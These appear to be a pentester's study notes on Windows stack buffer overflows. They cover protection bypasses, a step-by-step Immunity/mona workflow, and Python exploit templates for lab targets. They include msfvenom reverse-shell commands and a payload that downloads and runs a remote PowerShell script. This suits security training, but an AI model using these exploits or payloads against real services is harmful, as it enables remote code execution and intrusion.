Stack-Based BOF:
===============
Basics:
	Terms:
		Buffer:
			It refers to any area in memory where more than one piece of data is stored
		Stack Smashing:(aka Stack Overflow)	
			When input data overflows the Stack
		BOF:(Buffer Overflow)
			When input data overflows both the stack and the buffer
	Cause of BOF:
		Trying to store more data into stack that it overflows both stack and the buffer
		BOF happens in unsafe languages which allows use of pointers or provide raw access to memory
		Known Vulnerable Functions in C/C++:
			strcpy():
				Its safer version => strncpy()
			strcat():
			fgets():
			gets():
			fscanf():
			scanf():
			vsprintf():
			sprintf():
			printf():
			memcpy():
	Registers related to BOF:
		EIP stores Address of the next Assembly instruction to be executed next.
		EBP stores Address of Bottom of Stack.
		ESP stores Address of Top of Stack, so we use ESP to find top of stack.
	Security Implementations:
		ASLR:(Address Space Layout Randomization)
			Available in => OSX/Linux/Windows
			ASLR randomizes the base memory address for executables, libraries(dll), stack and heap by loading the same executable at different memory places.
			Base Address of DLL is randomized on each OS reboot
			This makes it difficult for an attacker to predict memory address and thus, causes exploit to fail.
			Bypass Techinques:
				A. Using non-ASLR modules:
					Using some module(dll) which has aslr disabled
					!mona noaslr
				A. Bruteforce:
					Here, we bruteforce return pointer(EIP) with plausible addresses until we reach the shellcode
					Success of this technique depends on how many exploitation attempts one can perform
					This method is used against those services which we are configured to restart automatically after a crash
				B. NOP-Sled:
					We place a lot of NOPs before our shellcode. Lets say our return pointer landed on a NOP, then, it will slide down to the shellcode
					More NOP => higher rate of success
		DEP:(Data Execution Prevention)
			Available in => OSX/Linux/Windows
			It monitors and protects certain pages(fixed-length continous block of virtual memory) of memory, preventing them from executing code.
			When DEP is enabled, all pages are marked as non-executable by default.
			Bypass Techniques:
				A. ROP Chaining:(Return Oriented Programming)
					Basics:
						Gadget:
							Small group of instructions that perform operation such as:
								arithemtical operations on registers
								check for conditional jumps
								store or load data
		Canary:(aka Stack Cookies)(aka Stack Canaries)
			In it, function prologue places a value next to return address on the stack and function epilouge checks if the value is there or not, if it is not, then it means that, BOF has taken place as BOF overwrites the stack
			Bypass Technique:
				A. Retrive/guess canary value and add it to payload:
				B. David Litchfield Method:
					Explained by him in his conference on Blackhat Asia 2003
		SEH:(Structured Exception Handing/Handler)
			Basics Terms:
				Exeception:
					An exception is an event that occurs during the execution of a program
				Linked List:
					It is a Data Structure
					Its a collection of nodes which together represent a sequence
					Each node points to the next node and every node contains a reference and data
			SEH Mechanism:
				Its a Windows mechanism to handle situations when a program throws an exception due to hardware or software issue. It handles them by catching those exceptions and solving them.
				SEH is implemented using a Linked List
			Aditional Security Mechanisms on SEH:
				SafeSEH:
					32-bit applications can be linked with /SAFESEH flag, which will produce a PE file with a table of safe exception handlers
					Its a compiler protection that protects SEH chains from being overwritten.
				SEHOP:(Structured Exception Handling Overwrite Protection)
					It is an extended version of SEH
					Implemented on:
						win server 2008 SP0
						win vista/7
	Note:
		To read more about Immunity Debugger => Read Exploit Development Tools Sheet
		To read more about mona.py => Read Exploit Development Tools Sheet
		To reas more about nasm => Read Assembly for Penesting sheet
Normal Stack-Based Buffer Overflow:
	Exploitation:(7 Steps)
		Stratergy:
			Put address for "JMP ESP" in EIP -> Store the SC in ESP -> Exploit
		Note:
			For a known BOF vuln, we dont need to follow 1st 7 steps.
		Step-0: Opening vulnapp/stuff:
			A. Open vuln.exe in Immunity Debugger:
				a. File -> Attach => attach a process:
					Using TCPView.exe to find PID:
						Sort by local port -> Find the port which vulnerable service is listening on -> copy PID
					Select the PID
				b. File -> Open -> Open a program(.exe)
					We can also add input this way
			B. Adjust Apperance:
				Right-click -> Apperance -> Font(all) -> OEM fixed font
				Options -> Apperance -> fonts -> Change -> (Consolas, Blod, 9) -> OK
			C. Press F9 => Run the prog
			D. In Deubugger's cli, type:
				!mona config -set workingfolder c:\mona\%p
			E. Find on which port is vulnapp listening:
				cmd> netstat -anbo | find "Listening"
				kali> nc -nv <ip> <port> => to cross check
			Note:
				If the binary, we are debugging is a windoes service, then we can restart it by:
					sc stop SLmail
					sc start SLmail
		Step-1: Fuzzing:(gives <crash_length>)
			Read Fuzzing Sheet
			Note:
				Fuzzing in required when we exploit a blackbox app.
				However, In most cases, fuzzing is not required as we are needed to exploit a known vulnerable program
		Step-2: Finding the Offset:(Offset => exact number of bytes to control the EIP) => gives "<offset_length>"
			msf-pattern_create -l <crash_length> => This will give "<pattern_create>" string
			./offset.py:(This will depend on )
				import socket, time, sys 
				ip = "MACHINE_IP"
				port = MACHINE_PORT 
				prefix = "<buffer_string>" # wireshark data
				offset = 0 
				overflow = "A" * offset 
				retn = "" 
				padding = "" 
				payload = "<pattern_create>" 
				postfix = "" 
				buffer = prefix + overflow + retn + padding + payload + postfix 
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				try: 
				    s.connect((ip, port)) 
					print("Sending evil buffer...") 
					s.send(buffer + "\r\n") 
				    print("Done!") 
				except: 
				    print("Could not connect.")
			Immunity CLI -> !mona findmsp -distance <crash_length> => gives "<offset_length>"
				better Alternative of msf-pattern_offset -l 800 -q <value_of_EIP_Register>
		Step-3: Controlling the EIP:(We basically do it to check if our earlier 2 steps were correct or not)
			Note:
				Controlling the EIP is the 1st goal of an attacker to execute BOF. We need to know the buffer size to control the EIP
			./control_eip.py:
				import socket, time, sys
				ip = "MACHINE_IP" 
				port = 1337 
				prefix = "<buffer_string>" # wireshark data
				offset = <offset_length> 
				overflow = "A" * offset 
				retn = "BBBB" 
				padding = "" 
				payload = "C" * (<crash_length> - <offset_length> - 4) 
				postfix = "" 
				buffer = prefix + overflow + retn + padding + payload + postfix
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				try: 
				    s.connect((ip, port)) 
					print("Sending evil buffer...") 
					s.send(buffer + "\r\n") 
				    print("Done!") 
				except: 
				    print("Could not connect.")
			Look into register window:
				EIP should have 42(B)
				ESP should have 43(C)
		Step-4: Locating Space for our shellcode:(Maybe Optional)(Need to add a script)
			A normal reverse shell payload requires around 410 bytes.(Maximum UpperBound => 600 bytes)
			Edit fuzzer.py:
				prefix = "A"*<exact offset>
				eip = "B"*4
				offset = "C"*<how many "C" are not being a part of stack>
				buffer = "D"*600 #max sc size
				buffer = prefix + eip + offset + buffer
			Run fuzzer.py and look into Registers Window of Immunity Debugger:
				The buffer goes to ESP, so Go to top of stack by looking at ESP's value and then count how many bytes actually came into the stack.
				If its >= 500:
					We are good to go to next step
				If its < 500:(Staging the exploit)
					We will First tranfer control to ECX and put our sc there.
					Find Opcode for JMP ECX:	
						msf-nasm_shell> jmp ecx => FFE1
					Edit Fuzzer.py:	
						prefix = "A"*<exact offset>
						eip = "B"*4
						offset = "C"*<how many "C" are not being a part of stack>
						first_stage = "\xff\xe1"
						buffer = "D"*600 #max sc size
						buffer = prefix + eip + offset + first_stage + buffer
					Note:
						Edit the other scripts accordingly for staged exploit
					Note:
						We will use "JMP ESP"(step-6) for staged exploit too bcoz where we save our s/c doesnt change anything.
		Step-5: Finding Bad Characters:
			Common BadChars:
				0x00 => null
				0x0D => /r
			./badchars.py:
				import socket, time, sys
				ip = "MACHINE_IP" 
				port = 1337 
				prefix = "<buffer_string>" # wireshark data
				offset = <offset_length> 
				overflow = "A" * offset 
				retn = "BBBB" 
				padding = "" 
				badchars = (
				"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
				"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
				"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
				"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
				"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
				"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
				"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
				"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
				"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
				"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
				"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
				"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
				"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
				"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
				"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
				"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
				payload = badchars + "C" * (<crash_length> - <offset_length> - 4 - 255) 
				postfix = "" 
				buffer = prefix + overflow + retn + padding + payload + postfix
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				try: 
				    s.connect((ip, port)) 
					print("Sending evil buffer...") 
					s.send(buffer + "\r\n") 
				    print("Done!") 
				except: 
				    print("Could not connect.")
			Lengthy Way:
				Right-click on "ESP" -> follow in Dump:
					Look at the dump and see where is the irregularity at(ex: 00). Notice the index of that irregularity and remove badchar of that index and run fuzzer.py again
			Smart Way:
				In Immunity Debugger CLI:
					!mona bytearray -b "\x00"
					!mona compare -f C:\mona\<app_name>\bytearray.bin -a <ESP_address> => this will gives us a list of bad chars.
						Lets say badchars are 00 07 08 2e 2f
						Run badchars.py without 00 and run above commands again
						Run badchars.py without 07 and run above commands again
		Step-6: Redirecting the execution flow:(Gives "<return_address>")
			Using JMP ESP statement:
				Lengthy Way:
					1. Locate all DLLs(aka modules) required for execution of our application:
						!mona modules => show all modules
							find a module Whose:
								1. No Memory Protection
								2. Address must not contain any badchar in it
					2. Find Address of Assembly instruction:	
						JMP ESP:(Jump to Address pointed by ESP(Top of Stack) upon execution)
							opcode equivalent => "\xff\xe4"
							!mona find -s "\xff\xe4" -m "<module_name>" => gives  "<address_from_jmpesp_command>"
						Note:
							Please ensure you select an address from the applications’ DLL ONLY, and NOT from OS DLLs. Application DLLs will be constant across operating systems, but we can NOT say the same for OS DLLs.
					3. Cross-Check the address:
						Go to immunity -> Assembly Instructions Window > Right-Click -> Go-To -> expression -> enter  "<address_from_jmpesp_command>" we found
							See if "<address_from_jmpesp_command>" actually points to JMP ESP
					4. "<return_address>":
						Convert "<address_from_jmpesp_command>" to Little Endian Format:
							Example => 0x62011af becomes \xaf\x11\x50\x62
				Smart Way:
					1. We have 2 options:
						A. !mona jmp -r esp -cpb "<bad_chars>" => gives "<address_from_jmpesp_command>" 
						B. !mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "<bad_chars>"
					2. Cross-Check the address:
						Go to immunity -> Assembly Instructions Window > Right-Click -> Go-To -> expression -> enter "<address_from_jmpesp_command>" we found
							See if "<address_from_jmpesp_command>" actually points to JMP ESP
					3. "<return_address>":
						Convert "<address_from_jmpesp_command>" to Little Endian Format:
							Example => 0x62011af becomes \xaf\x11\x50\x62
			Using CALL ESP statement:
				Note: Try call if jmp is not found!
		Step-7: Exploiting BOF:
			Generate ShellCode:
				A. msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '<badchars>' EXITFUNC=thread -f python -v payload –e x86/shikata_ga_nai
				B. msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.11.0.41/nishang.ps1')\"" -b '<badchars>' -f python -v payload –e x86/shikata_ga_nai
				Explanation:
					-v => This flag is used to set name of variable which will store shellcode
					-i 3 => via Sources
					EXITFUNC=thread:
						Default exit method of msfvenom SC is "ExitProcessAPI". This exit method shutdowns whole process when the reverse shell is terminated, effectively causing it to crash.
						If the program we are exploiting is a threaded application, we can try to avoid crashing the service completely by using the "ExitThreadAPI", which will only terminate the affected thread of the program. This will allow us to repeatedly exploit the service and exit the shell without crashing the service.
					NOPs:
						We encoded the shellcode as generic shellcode has badchars in it.
						But, Because of the encoding, the SC is not directly executable, so it is prepended by a decoder stub. This stub is used to iterate over the encoded SC bytes and decode them back to their original executable form. In order to perform this task, the stub needs to gather its address in memory and from there, look a few bytes ahead to locate the encoded shellcode that it needs to decode.
						As part of the process of gathering stub’s location in memory, the code performs a sequence of assembly instructions, which are commonly referred as a GetPC routines (a short routine that moves the value of the EIP register into another register). 
						GetPC routines used by shikata_ga_nai have an issue of writing some data at and around the top of the stack. This eventually mangles at least a couple of bytes close to the address pointed at by the ESP register. This eventually fails the decoding process and crashes the target process.
						We can bypass it in 2 ways:
							A. Adjust ESP backwards, making use of assembly instructions such as DEC ESP, SUB ESP, 0xXX, before executing the decoder.
							B. NOP slide:
								We add a series of NOP instructions in front of our payload.
								These instructions, will let CPU "slide" through the NOPs until the payload is reached.
								Note:
									Number of NOPs in NOP-Sled might differ for each one, so try anything from 7 to 32
								Note:
									To read more about NOP, see Assembly for Pentesting Sheet
			./exploit.py:
				import socket, time, sys
				ip = "MACHINE_IP" 
				port = 1337 
				prefix = "<buffer_string>" # wireshark data
				offset = <offset_length> 
				overflow = "A" * offset 
				retn = "<return_address>" 
				padding = "\x90" * 16 # NOPs to create space for payload
				payload = b"" 
				payload += b"\xd9\xcd\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x52\..." 
				payload += ...
				...
				...
				postfix = "" 
				buffer = prefix + overflow + retn + padding + payload + postfix 
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				try: 
				    s.connect((ip, port)) 
					print("Sending evil buffer...") 
					s.send(buffer + "\r\n") 
				    print("Done!") 
				except: 
				    print("Could not connect.")
	Vulnerable Programs to practice:
		slmail
		THM BOF			    
First Stage Stack-Based Buffer Overflows:
	Basics:
		Sometimes, space after EIP is very less, can be even 8 bytes. In such cases, we add a stage to our exploit.
	Exploitation:
		Follow the first 4 steps as explained in "Normal Stack-Based Buffer Overflow" Section
		Step-4 Continued: Staging the Exploit:
			This step consists of three very important steps:
				Step-4a: Look into Immunity Debbuger after executing step-3(./Eip_Control.py)
					We need to find out which Register points to our payload.
					In most cases, it will be ESP. But it can be any Register.
					To Find it out:
						Look for a register having a string of ASCII in front of it having the payload we sent (AAAABBBCCCC-----)
				Step-4b:
					We need to find a JMP or CALL instruction for the particular register
					We will use the limited space available after the ESP to create the "First Stage Shellcode"
					nasm> jmp <register>
					./Loc_First_Stage.py:
						#!/usr/bin/env python3
						import socket

						ip = "MACHINE_IP"
						port = MACHINE_PORT

						prefix = "<buffer_string>" # netcat data
						offset = <offset_length>
						overflow = "A" * offset
						retn = "BBBB"
						padding = ""
						payload = "opcode from nasm" + "\x90" * (<crash_length> - <offset_length> - 4 - 4)
						postfix = "" # No D's here

						buffer = prefix + overflow + retn + padding + payload + postfix

						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

						try:
						  s.connect((ip, port))
						  print("Sending evil buffer...")
						  s.send(bytes(buffer + "\r\n", "latin-1"))
						  print("Done!")
						except:
						  print("Could not connect.")					
					Note:
						We added "/x90"(NOPs) in order to maintain the same length
				Step-4c:
					Immunity Debugger -> Right-click on ESP Register -> follow in dump -> we should see value of opcode we passed.
		Step-5: Finding Bad Characters:
			We need to divide the badchars into strings of "x" bytes, where x is the space after EIP:
				./Divide.py:(gives "<badchar_string>")
					#!/usr/bin/env python2		
					buf_len = <space_after_eip>
					for i in range(0, 256/buf_len + 1):
					    badchars = "badchars = \""
					    for x in range(buf_len*i+1, buf_len*(i+1)+1):
					        if x < 256:
					            badchars += "\\x" + '{:02x}'.format(x)
					    badchars += "\""
					    print badchars
				Note:
					We determine "<space_after_eip>" by running Eip_offset.py and counting how many "C" are actually visible in stack
			Now, we need to pass every string one by one:
				./BadChars.py:
					#!/usr/bin/env python3
					import socket

					ip = "MACHINE_IP"
					port = MACHINE_PORT
					badchars = <badchar_string>

					prefix = "<buffer_string>" #netcat data
					offset = <offset_length>
					overflow = "A" * offset
					retn = "BBBB"
					padding = ""
					payload = badchars #no need to pass opcode for jmp/call inst to register we found as its only needed in step-7 for passing s/c
					postfix = ""

					buffer = prefix + overflow + retn + padding + payload + postfix

					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

					try:
					  s.connect((ip, port))
					  print("Sending evil buffer...")
					  s.send(bytes(buffer + "\r\n", "latin-1"))
					  print("Done!")
					except:
					  print("Could not connect.")
		Step-6: Redirecting the execution flow:(Gives "<return_address>")
			Same as that of Normal Stack Based Buffer Overflows
		Step-7: Exploiting BOF:
			Generate ShellCode:(This will give us <ShellCode>)
				msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '<badchars>' EXITFUNC=thread -f c –e x86/shikata_ga_nai -i 3
					This will give us <ShellCode>
				Explanation:
					-v => This flag is used to set name of variable which will store shellcode
					-i 3 => via Sources
					EXITFUNC=thread:
						Default exit method of msfvenom SC is "ExitProcessAPI". This exit method shutdowns whole process when the reverse shell is terminated, effectively causing it to crash.
						If the program we are exploiting is a threaded application, we can try to avoid crashing the service completely by using the "ExitThreadAPI", which will only terminate the affected thread of the program. This will allow us to repeatedly exploit the service and exit the shell without crashing the service.
			Where are we going to save the s/c?
				We will save the s/c in some register which reflects our "overflow" string.
				We will also need to decrease the number of "A"s to acomodate shellcode and NOPs.
			./exploit.py:
				#!/usr/bin/env python3
				import socket

				ip = "MACHINE_IP"
				port = MACHINE_PORT
				padding = "\x90" * 16 #nops
				payload = ("<ShellCode>")

				prefix = "<buffer_string>" # netcat data
				offset = <offset_length>
				overflow = "A" * (offset - len(padding) -len(payload))
				retn = "<return_address>"
				first_stage = "opcode from nasm" + "\x90" * (<crash_length> - <offset_length> - 4 - 4)

				postfix = ""

				buffer = prefix + padding + payload + overflow + retn + first_stage + postfix

				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

				try:
				  s.connect((ip, port))
				  print("Sending evil buffer...")
				  s.send(bytes(buffer + "\r\n", "latin-1"))
				  print("Done!")
				except:
				  print("Could not connect.")
			Note:
				How many NOPs to use:
					20	
SEH Stack-Based Buffer Overflows: 






























Exploitation script:
	import socket, time, sys 
	ip = "MACHINE_IP" 
	port = MACHINE_PORT 
	prefix = "<buffer_string>"  # WireShark data
	offset = 0 # from pattern_create
	overflow = "A" * offset # Overflow String
	eip = "" #JMP ESP Return Address
	padding = "" 
	payload = "<pattern_create>" 
	postfix = "" 
	buffer = prefix + overflow + eip + padding + payload + postfix 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	try: 
	    s.connect((ip, port)) 
		print("Sending evil buffer...") 
		s.send(buffer + "\r\n") 
	    print("Done!") 
	except: 
	    print("Could not connect.")






	


1. Do only these:
	https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
	https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
2. Read walkthroughs of these apps:
	Vulnserver:
		https://samsclass.info/127/proj/vuln-server.htm
	Minishare 1.4.1
	Savant Web Server 3.1
	Freefloat FTP Server 1.0
	Core FTP Server 1.2
	WarFTP 1.65
	VUPlayer 2.4.9
3. Do these Vulnerable Boxes:
	Brainpan 1: https://www.vulnhub.com/entry/brainpan-1,51/
	Pinky’s Palace version 1: https://www.vulnhub.com/entry/pinkys-palace-v1,225/
	Stack Overflows for Beginners: https://www.vulnhub.com/entry/stack-overflows-for-beginners-101,290/
	SmashTheTux: https://www.vulnhub.com/entry/smashthetux-101,138/
	Pandora’s Box: https://www.vulnhub.com/entry/pandoras-box-1,111/
4. https://courses.yaksas.in/ => 2 courses
5. www.udemy.com/course/practical-buffer-overflows-for-oscp/ => indian, so see subs






